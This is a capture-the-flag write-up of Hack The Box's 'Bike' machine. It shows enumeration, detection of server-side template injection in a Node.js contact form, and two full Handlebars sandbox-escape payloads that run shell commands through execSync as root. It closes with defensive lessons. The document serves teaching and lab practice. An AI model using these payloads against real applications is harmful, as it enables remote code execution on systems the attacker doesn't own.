Yooo guys, it's ju4dy the landlord again.

# Bike — Hack The Box Starting Point

|  |  |
| --- | --- |
| **Platform** | Hack The Box — Starting Point |
| **Tier** | 1 |
| **Difficulty** | Very easy |
| **Operating system** | Linux |
| **Target IP** | `10.129.97.64` |
| **Skills** | Server-side template injection, Handlebars sandbox escape, Node.js remote code execution |

## Overview

Bike is a Linux host running a small Node.js application on Express. The site is a storefront with a contact
form, and the e-mail field is passed into a Handlebars template without sanitization. The result is
server-side template injection (SSTI): an arithmetic probe is evaluated by the server, and a known Handlebars
gadget chain turns that evaluation into command execution.

The command runs in the context of the Node.js process, which here is `root`. Reading
`/root/flag.txt` therefore needs no privilege escalation step at all.

## Enumeration

```bash
nmap -sVC 10.129.97.64
```

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-14 21:47 +0100
Nmap scan report for 10.129.97.64
Host is up (0.52s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title:  Bike
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services, and only one of them is interesting. SSH is a stock Ubuntu build with no exposed credentials, so
the attack surface is the web application on port `80`. The service banner identifies Node.js behind Express
rather than a traditional PHP or Java stack, which narrows the likely template engines to the JavaScript
family — Handlebars, Pug, EJS, Nunjucks.

The storefront itself has a contact form that asks for an e-mail address and a message. The e-mail value is
rendered back into the page, which makes it the obvious place to test.

## Exploitation

### Detecting template injection

Reflected input is not automatically a vulnerability, so the first step is to distinguish three possibilities:
the value is escaped and rendered as text (safe), it is echoed unescaped (cross-site scripting), or it is
compiled by a template engine (SSTI). Injecting template syntax separates the last case from the other two.

The probe was entered in the **E-mail** field and submitted:

```text
{{7*7}}
```

The response came back with `49` where the address should have been.

<!-- screenshot: {{7*7}} rendered as 49 in the response -->

A reflected string would still read `{{7*7}}`; the number proves the server parsed and evaluated the
expression before sending the page. The application is therefore running user input through Handlebars, and
Handlebars exposes enough of its own runtime to escape the template sandbox.

### From template evaluation to command execution

Handlebars blocks direct access to JavaScript globals, so the payload has to walk to a `Function` constructor
through objects the template can legitimately reach. The chain used here follows a well-known gadget:

1. `{{#with "s" as |string|}}` binds a string so its methods are reachable as `string.*`.
2. `{{#with split as |conslist|}}` abuses `string.split`, whose `constructor` is `Function`.
3. The payload pushes a body string into that constructor and invokes it with `string.sub.apply 0 codelist`.
4. The body calls `global.process.mainModule.require('child_process').execSync(...)`, giving synchronous shell
   execution inside the Node.js process.

The first payload runs `id` to confirm execution and the account the process is running as:

```text
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return global.process.mainModule.require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

The returned output showed the Node.js process running as `root`. The same chain with a different command
reads the flag:

```text
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return global.process.mainModule.require('child_process').execSync('cat /root/flag.txt')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

The command output appears inline in the HTTP response, so no listener or reverse shell is required:

<!-- screenshot: flag.txt contents returned by the execSync payload -->

## Key takeaways

- **User input must never be compiled as a template.** Pass values as template *data* (`{{email}}`) rather
  than concatenating them into the template source; that single change removes the entire class of bug.
- **Sandbox escapes are routine, not exotic.** Handlebars' restrictions are not a security boundary, and the
  `Function` constructor is reachable from ordinary string methods. Do not rely on template-engine sandboxes
  to contain untrusted input.
- **The web process should not run as root.** A Node.js service has no reason to hold that privilege; a
  dedicated low-privilege account would have limited this from full compromise to a single command execution.
- **Arithmetic probes belong in every test plan.** `{{7*7}}`, `${7*7}` and `<%= 7*7 %>` cost one request each
  and immediately separate reflection from evaluation.
- **Output encoding is not input validation.** The e-mail field was probably intended only to be displayed;
  the fact that the value round-tripped through a template is what made it dangerous.
